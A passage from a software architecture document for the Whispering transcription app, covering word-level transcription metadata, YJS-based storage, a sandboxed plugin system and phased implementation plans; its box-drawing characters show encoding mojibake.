â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Comparison: Current vs Enhanced

| Aspect               | Current (main)   | Enhanced (feat/epicenter-app)    |
| -------------------- | ---------------- | -------------------------------- |
| **Storage format**   | Markdown + YAML  | YJS workspace + JSON fields      |
| **Word-level data**  | Not supported    | `json` field with TypeBox schema |
| **Type safety**      | Manual parsing   | Full TypeScript inference        |
| **Collaboration**    | Not supported    | YJS built-in                     |
| **Schema evolution** | Manual migration | Epoch-based migrations           |
| **Audio storage**    | File system      | File system (unchanged)          |
| **Query capability** | File system scan | YJS + optional SQLite            |

### Benefits of YJS Integration

1. **Real-time collaboration** - Multiple users can edit transcript simultaneously
2. **Offline-first** - YJS handles sync when connection restored
3. **Type safety** - TypeBox schemas provide runtime validation
4. **Efficient updates** - YJS only syncs changed segments, not entire document
5. **Undo/redo** - YJS UndoManager provides built-in history

### Audio File Handling

Audio files remain separate from YJS storage (binary data not suitable for CRDTs):

```typescript
// Audio storage interface (unchanged from current)
interface AudioStorage {
	// Save audio blob
	saveAudio(recordingId: string, audio: Blob): Promise<void>;

	// Get audio for playback
	getAudioBlob(recordingId: string): Promise<Blob | null>;

	// Get playback URL
	getAudioUrl(recordingId: string): Promise<string>;

	// NEW: Save generated audio clip
	saveGeneratedAudio(
		recordingId: string,
		generatedId: string,
		audio: Blob,
	): Promise<void>;

	// NEW: Get generated audio
	getGeneratedAudioBlob(
		recordingId: string,
		generatedId: string,
	): Promise<Blob | null>;
}
```

### Migration Path

```typescript
// Migration from legacy recording to editable project
async function migrateToProject(recordingId: string): Promise<void> {
	const workspace = getWhisperingWorkspace();
	const recording = workspace.tables.recordings.get({ id: recordingId });

	if (recording.status !== 'valid') {
		throw new Error('Recording not found');
	}

	// Skip if already a project
	if (recording.row.segments !== null) {
		return;
	}

	// 1. Get audio blob
	const audioBlob = await audioStorage.getAudioBlob(recordingId);
	if (!audioBlob) {
		throw new Error('Audio not found');
	}

	// 2. Re-transcribe with word-level timestamps
	const transcriptionResult = await transcriptionService.transcribe(audioBlob, {
		returnWordTimestamps: true, // NEW option
	});

	// 3. Convert to document items
	const segments = transcriptToDocumentItems(
		transcriptionResult.segments,
		recordingId, // source reference
		'Speaker', // default speaker name
	);

	// 4. Update recording
	workspace.tables.recordings.update({
		id: recordingId,
		segments,
		isProject: true,
		// Keep transcribedText for backwards compat
	});
}

// Helper: Convert transcript segments to document items
function transcriptToDocumentItems(
	segments: TranscriptSegment[],
	sourceId: string,
	defaultSpeaker: string,
): DocumentItem[] {
	const items: DocumentItem[] = [
		{
			type: 'paragraph_start',
			uuid: nanoid(),
			speaker: defaultSpeaker,
			language: null,
		},
	];

	for (const segment of segments) {
		if (segment.type === 'word') {
			items.push({
				type: 'text',
				uuid: nanoid(),
				source: sourceId,
				sourceStart: segment.start,
				length: segment.end - segment.start,
				text: segment.word,
				conf: segment.confidence,
			});
		} else if (segment.type === 'non_speech') {
			items.push({
				type: 'non_text',
				uuid: nanoid(),
				source: sourceId,
				sourceStart: segment.start,
				length: segment.end - segment.start,
			});
		}
	}

	items.push({ type: 'paragraph_end', uuid: nanoid() });
	return items;
}
```

### Transcription Service Update

```typescript
// Current transcription return type
type TranscriptionResult = string;

// Enhanced return type
type TranscriptionResult = {
	text: string; // Plain text (backwards compat)
	segments?: TranscriptSegment[]; // Word-level data (if requested)
};

type TranscriptSegment = {
	type: 'word' | 'punctuation' | 'non_speech';
	word: string;
	start: number; // seconds
	end: number; // seconds
	confidence: number;
};

// API support for word-level timestamps
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Provider        â”‚ Parameter
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// OpenAI Whisper  â”‚ response_format: 'verbose_json'
//                 â”‚ timestamp_granularities: ['word']
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Groq            â”‚ response_format: 'verbose_json'
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Deepgram        â”‚ Default behavior (always returns words)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// AssemblyAI      â”‚ Default behavior
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// ElevenLabs      â”‚ Supported (per docs)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Local Whisper   â”‚ whisper.cpp supports word timestamps
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

### Discarded Transcription Data

Currently, all transcription services extract **only `.text.trim()`**, discarding significant metadata that would enable text-based editing, confidence visualization, and speaker identification.

#### Data Being Dropped by Provider

| Provider        | Word Timestamps |        Segments         |          Confidence           |         Speaker ID         | Language  | Notes                           |
| --------------- | :-------------: | :---------------------: | :---------------------------: | :------------------------: | :-------: | ------------------------------- |
| **OpenAI**      |    Available    |        Available        |           Available           |             âŒ             | Available | Needs `verbose_json` option     |
| **Deepgram**    |    Available    |        Available        | **In schema, not extracted!** |         Available          | Available | Rich metadata available         |
| **Groq**        |    Available    |        Available        |           Available           |             âŒ             | Available | OpenAI-compatible               |
| **ElevenLabs**  |    Available    |        Via words        |           Available           | **Requested but dropped!** | Available | `diarize: true` set but ignored |
| **Mistral**     |       âŒ        |        Available        |              âŒ               |             âŒ             | Available | Segment timestamps only         |
| **Whisper.cpp** |    Available    |        Available        |           Available           |             âŒ             | Available | Via params                      |
| **Parakeet**    |       âŒ        | **Requested, dropped!** |              âŒ               |             âŒ             |    âŒ     | Rust-side discard               |

#### Critical Findings

1. **ElevenLabs `diarize: true`** - Speaker diarization is explicitly requested but results completely discarded:

   ```typescript
   // Line 64-74 in elevenlabs.ts
   const transcription = await client.speechToText.convert({
   	file: audioBlob,
   	diarize: true, // REQUESTED!
   });
   return Ok(transcription.text.trim()); // speaker_id DROPPED!
   ```

2. **Deepgram `confidence`** - Defined in schema but never extracted:

   ```typescript
   // Line 48-56 in deepgram.ts
   const DeepgramResponse = type({
   	results: {
   		channels: type({
   			alternatives: type({
   				transcript: 'string',
   				'confidence?': 'number', // EXISTS but NEVER USED!
   			}).array(),
   		}).array(),
   	},
   });
   ```

3. **Parakeet timestamps** - Explicitly requested in Rust but discarded:

   ```rust
   // transcription.rs line 636-639
   let params = ParakeetInferenceParams {
       timestamp_granularity: TimestampGranularity::Segment,  // REQUESTED!
       ..Default::default()
   };
   let transcript = result.text.trim().to_string();  // Timestamps DROPPED!
   ```

4. **OpenAI/Groq** - Have `verbose_json` and `timestamp_granularities` options but not used.

#### What We're Missing

| Missing Data          | Use Case                                      |
| --------------------- | --------------------------------------------- |
| Word-level timestamps | Text-based editing (Sections 16-18)           |
| Confidence scores     | Highlight uncertain words for review          |
| Speaker diarization   | Meeting transcripts, interviews, podcasts     |
| `no_speech_prob`      | Detect non-speech audio sections              |
| `compression_ratio`   | Flag potentially failed transcriptions        |
| Language detection    | Auto-set UI language, multi-language support  |
| Audio events          | Detect laughter, applause, music (ElevenLabs) |

### Enhanced Transcription Return Type

```typescript
type TranscriptionResult = {
	// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
	// NORMALIZED DATA (always present, provider-agnostic)
	// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
	text: string;
	segments?: TranscriptSegment[];
	language?: {
		code: string;
		confidence?: number;
	};
	duration?: number;

	// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
	// PROVENANCE (lightweight, always stored)
	// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
	provenance: {
		provider:
			| 'openai'
			| 'deepgram'
			| 'elevenlabs'
			| 'groq'
			| 'mistral'
			| 'local';
		model: string;
		timestamp: string; // When transcribed (ISO 8601)
		apiVersion?: string; // For debugging API changes
	};

	// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
	// RAW RESPONSE (optional, user-configurable)
	// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
	raw?: unknown; // Original API response, stored if setting enabled
};

type TranscriptSegment = {
	text: string;
	start: number; // Start time (seconds)
	end: number; // End time (seconds)
	confidence?: number; // 0-1 confidence score
	speakerId?: string; // Speaker identification
	type?: 'speech' | 'non_speech' | 'audio_event';
	words?: TranscriptWord[]; // Word-level detail (if available)
};

type TranscriptWord = {
	word: string;
	start: number;
	end: number;
	confidence?: number;
	speakerId?: string;
};
```

### Raw Response Storage Strategy

#### Tradeoffs

| Approach        | Storage         | Future-Proof          | Queryable           | Privacy        |
| --------------- | --------------- | --------------------- | ------------------- | -------------- |
| Normalized only | âœ… Small        | âŒ Must re-transcribe | âœ… Easy             | âœ… Easy        |
| Raw only        | âŒ 4x larger    | âœ… Re-extract anytime | âŒ Hard             | âŒ Hard        |
| **Hybrid**      | âœ… Configurable | âœ… When raw stored    | âœ… Query normalized | âœ… User choice |

#### Storage Size Comparison

```
1-minute recording (~150 words):
â”œâ”€â”€ text only:     ~1 KB
â”œâ”€â”€ + segments:    ~7.5 KB (normalized)
â””â”€â”€ + raw:         ~30 KB (4x increase)

1000 recordings:
â”œâ”€â”€ Without raw:   ~8.5 MB
â””â”€â”€ With raw:      ~38.5 MB (+30 MB)
```

#### Recommended: Hybrid Approach

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    RAW RESPONSE STORAGE DECISION                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  ALWAYS STORE:                                                           â”‚
â”‚  â€¢ Normalized data (segments, language, duration)                       â”‚
â”‚  â€¢ Provenance (provider, model, timestamp) - tiny, invaluable           â”‚
â”‚                                                                          â”‚
â”‚  OPTIONALLY STORE RAW (user setting, default: off):                     â”‚
â”‚  â€¢ Development/debugging mode                                           â”‚
â”‚  â€¢ When transcription confidence < threshold                            â”‚
â”‚  â€¢ Power users who want maximum data retention                          â”‚
â”‚  â€¢ First N recordings (bootstrap learning)                              â”‚
â”‚                                                                          â”‚
â”‚  NEVER STORE RAW:                                                        â”‚
â”‚  â€¢ Low storage mode / mobile                                            â”‚
â”‚  â€¢ Privacy-sensitive contexts                                           â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### Updated Workspace Schema

```typescript
const WHISPERING_TEMPLATE = {
	tables: {
		recordings: table({
			fields: {
				// ... existing fields ...

				// Normalized segments (always stored when available)
				segments: json({
					schema: Type.Array(TranscriptSegmentSchema),
					nullable: true,
				}),

				// Provenance (lightweight, always stored)
				transcriptionProvenance: json({
					schema: Type.Object({
						provider: Type.String(),
						model: Type.String(),
						timestamp: Type.String(),
						apiVersion: Type.Optional(Type.String()),
					}),
					nullable: true,
				}),

				// Raw response (optional, based on setting)
				transcriptionRawResponse: json({
					schema: Type.Unknown(), // Any JSON
					nullable: true,
				}),

				// Detected language
				detectedLanguage: json({
					schema: Type.Object({
						code: Type.String(),
						confidence: Type.Optional(Type.Number()),
					}),
					nullable: true,
				}),

				// Audio duration
				audioDuration: real({ nullable: true }),
			},
		}),
	},
	kv: {
		// User setting to control raw storage
		storeRawTranscriptionResponses: setting({
			name: 'Store Raw Responses',
			description:
				'Keep original API responses for debugging. Uses more storage.',
			field: boolean({ default: false }),
		}),
	},
};
```

#### Provider-Specific Changes Required

| Provider       | Change                                                                     |
| -------------- | -------------------------------------------------------------------------- |
| **OpenAI**     | Add `response_format: 'verbose_json'`, `timestamp_granularities: ['word']` |
| **Deepgram**   | Extract existing `confidence`, add `words` array to schema                 |
| **ElevenLabs** | Extract `words` array with `speaker_id`, enable `tag_audio_events`         |
| **Groq**       | Same as OpenAI                                                             |
| **Mistral**    | Add `timestampGranularities: ['segment']`                                  |
| **Parakeet**   | Return timestamps from Rust layer (already requested!)                     |

#### Backwards Compatibility

```typescript
// Service returns enhanced result
const result = await transcriptionService.transcribe(audio, options);

// Existing code still works (just uses .text)
recording.transcribedText = result.text;

// New code can use rich metadata
if (result.segments) {
	recording.segments = convertToDocumentItems(result.segments);
}
if (result.provenance) {
	recording.transcriptionProvenance = result.provenance;
}
if (result.language) {
	recording.detectedLanguage = result.language;
}
```

### Implementation Phases for Vault Integration

| Phase | Scope                                                      | Effort  |
| ----- | ---------------------------------------------------------- | ------- |
| **1** | Add `segments`, `speakers`, `isProject` fields to template | 1 day   |
| **2** | Add `provenance`, `rawResponse`, `detectedLanguage` fields | 0.5 day |
| **3** | Update transcription services to return enhanced result    | 4 days  |
| **4** | Implement `migrateToProject()` function                    | 2 days  |
| **5** | Add generated audio storage (`{id}.generated/`)            | 1 day   |
| **6** | Update UI to show "Edit as Project" button                 | 1 day   |
| **7** | Sync `transcribedText` when `segments` changes             | 1 day   |
| **8** | Add "Store raw responses" setting in UI                    | 0.5 day |

**Total: ~11 days** (before Editor UI work)

---

## Recommendations

### Architecture Decision

**Recommended: Capability-Based Plugin System with Wasm + iframes**

1. **Service plugins** (transcription, completion): Wasm (Extism) for security
2. **UI plugins** (pages, components): Pre-compiled Svelte with iframe fallback for untrusted
3. **System plugins** (CPAL, FFmpeg): Native Rust, verified/signed only

### Plugin Manifest Schema

```typescript
interface PluginManifest {
	id: string;
	name: string;
	version: string;
	whisperingVersion: string; // Compatibility

	capabilities: {
		network?: string[];
		'settings:read'?: string[];
		'settings:write'?: string[];
		'audio:read'?: boolean;
		'clipboard:write'?: boolean;
		'transcription:provide'?: boolean;
		'routes:register'?: boolean;
	};

	provides?: {
		transcriptionServices?: TranscriptionPlugin[];
		completionProviders?: CompletionPlugin[];
		routes?: RouteDefinition[];
	};
}
```

### Implementation Phases: Plugin System

| Phase | Scope                                         | Effort  |
| ----- | --------------------------------------------- | ------- |
| **1** | Plugin loader + Groq transcription extraction | 2 weeks |
| **2** | Remaining transcription services              | 2 weeks |
| **3** | Completion providers                          | 1 week  |
| **4** | Recordings page as optional plugin            | 2 weeks |
| **5** | Mobile recordings alternative plugin          | 1 week  |
| **6** | Transformations page extraction               | 2 weeks |
| **7** | Navigation as pluggable                       | 1 week  |

### Implementation Phases: Text-Based Editing & Voice Synthesis

| Phase | Scope                                              | Effort  | Dependencies |
| ----- | -------------------------------------------------- | ------- | ------------ |
| **1** | Word-level timestamps in transcription             | 1 week  | None         |
| **2** | Document model + Editor Actor                      | 2 weeks | Phase 1      |
| **3** | Playback with RenderItems                          | 1 week  | Phase 2      |
| **4** | FFmpeg export pipeline                             | 2 weeks | Phase 3      |
| **5** | Editor UI (waveform, transcript sync)              | 3 weeks | Phase 4      |
| **6** | Voice Synth Actor + plugin interface               | 1 week  | Phase 5      |
| **7** | Stock voice TTS plugins (OpenAI, Piper)            | 1 week  | Phase 6      |
| **8** | Voice cloning (ElevenLabs, Coqui XTTS)             | 2 weeks | Phase 7      |
| **9** | Advanced features (styles, streaming, local clone) | 2 weeks | Phase 8      |

**Total for text-based editing + voice synthesis: ~16 weeks**

### Epicenter Platform Migration

| Phase | Scope                                                |
| ----- | ---------------------------------------------------- |
| **1** | Extract core services to `@epicenter/core`           |
| **2** | Integrate `@epicenter/hq` for Whispering data        |
| **3** | Create Epicenter shell (app switcher, global search) |
| **4** | Refactor Whispering as Epicenter app                 |
| **5** | Build additional apps (Notes, Journal, etc.)         |

---

## Next Steps

### Immediate (If Proceeding)

1. **Design plugin manifest schema** in detail
2. **Prototype plugin loader** for one extension point (e.g., transcription)
3. **Extract Groq transcription** as first plugin
4. **Validate security model** with capability checking
5. **Set up jsrepo** for plugin distribution
6. **Implement permission UI** (allow/ask/deny with glob patterns)
7. **Define event schema** for Functional Core (WhisperingEvent types)
8. **Build plugin SDK** with WhisperingBridge class

### Questions to Answer

1. **Single app or multi-window?** Tabs vs separate windows vs hybrid
2. **Data sharing permissions?** Default read access vs explicit grants
3. **Sync strategy?** Local-only vs optional cloud sync
4. **Distribution model?** Bundled core apps + marketplace?
5. **Verified publisher requirements?** DNS vs GitHub vs time-based?
6. **Tier 3 signing process?** Who reviews? How long?

### Research to Continue

**Plugin System:**

1. Tauri plugin patterns for native API exposure
2. Extism integration with Tauri/Rust
3. YJS sync providers for cross-device
4. Plugin marketplace UX patterns
5. jsrepo private registry setup
6. GitHub Artifact Attestations workflow
7. Sigstore/cosign integration for verification UI
8. Event sourcing libraries for TypeScript (or roll own)
9. YJS observer â†’ plugin event bridge patterns

**Text-Based Editing:** 10. FFmpeg filter chains for Tauri (audio/video splicing) 11. Waveform visualization libraries (wavesurfer.js, Web Audio API) 12. Transcript â†” waveform synchronization patterns 13. Non-destructive edit list formats (EDL, AAF) 14. Word-level timestamp providers (comparison: Whisper vs Deepgram vs AssemblyAI)

**Voice Synthesis:** 15. TTS provider comparison (latency, quality, pricing, voice cloning) 16. Local voice cloning options (Coqui XTTS, Bark, etc.) 17. Voice clone consent and legal requirements 18. Audio watermarking for AI-generated content 19. Prosody matching across spliced segments

---

## Appendix A: File References

### Whispering Architecture

- Services: `apps/whispering/src/lib/services/`
- Query layer: `apps/whispering/src/lib/query/`
- Settings: `apps/whispering/src/lib/settings/settings.ts`
- Commands: `apps/whispering/src/lib/commands.ts`
- Transcription registry: `apps/whispering/src/lib/services/isomorphic/transcription/registry.ts`

### Epicenter Packages

- HQ (YJS workspaces): `packages/epicenter/`
- Vault Core: `packages/vault-core/`
- UI Components: `packages/ui/`
- Svelte Utils: `packages/svelte-utils/`

### Key Patterns

- Service factory: `createMyService()` â†’ `MyServiceLive`
- Platform detection: `window.__TAURI_INTERNALS__`
- Settings schema: ArkType with progressive validation

---

## Appendix B: Audapolis Reference

[Audapolis](https://github.com/bugbakery/audapolis) is an open-source text-based audio/video editor that informed our architecture for Section 16 and 17.

### Key Files

| File                                | Purpose                                          |
| ----------------------------------- | ------------------------------------------------ |
| `app/src/core/document.ts`          | Document model, source references, serialization |
| `app/src/core/player.ts`            | Playback using RenderItems                       |
| `app/src/core/ffmpeg.ts`            | Export pipeline with segment concatenation       |
| `app/src/state/editor/types.ts`     | Editor state, cursor, selection                  |
| `app/src/state/editor/edit.ts`      | Edit reducers (delete, paste, etc.)              |
| `app/src/state/editor/selectors.ts` | Computed timing, RenderItems generation          |

### Architecture Patterns We Adopted

1. **Source Reference Model** - Words point to positions in source media, not stored audio
2. **Flat Document Array** - Items with paragraph markers vs nested structure
3. **Computed Timing** - `absoluteStart` computed on-demand, not stored
4. **RenderItems** - Edit Decision List for playback/export
5. **ZIP File Format** - Document JSON + source media in one portable file

### Differences from Audapolis

| Aspect               | Audapolis                  | Our Design                  |
| -------------------- | -------------------------- | --------------------------- |
| **Framework**        | Electron + React + Redux   | Tauri + Svelte + Actors     |
| **State Management** | Redux + Immer + redux-undo | Actor state with FC/IS      |
| **Voice Synthesis**  | Not supported              | Voice Synth Actor + plugins |
| **Plugin System**    | None                       | Sandboxed iframes + CSP     |
| **Data Sync**        | Local files only           | YJS workspaces              |
| **Transcription**    | External (Vosk server)     | Pluggable (cloud + local)   |

---

## Appendix C: Glossary

| Term                         | Definition                                                                    |
| ---------------------------- | ----------------------------------------------------------------------------- |
| **Source Reference**         | Pointer to a position (start time, duration) in original media                |
| **RenderItem**               | Instruction for playback/export: "play X seconds from source Y at position Z" |
| **Edit Decision List (EDL)** | Sequence of RenderItems defining the final output                             |
| **Non-Destructive Editing**  | Original media unchanged; edits stored as references                          |
| **Voice Clone**              | AI model trained on speaker's voice for synthesis                             |
| **Generated Text**           | Document item with AI-synthesized audio instead of source reference           |
| **Word-Level Timestamps**    | Per-word start/end times from transcription                                   |
| **Computed Timing**          | Absolute positions calculated from item lengths, not stored                   |
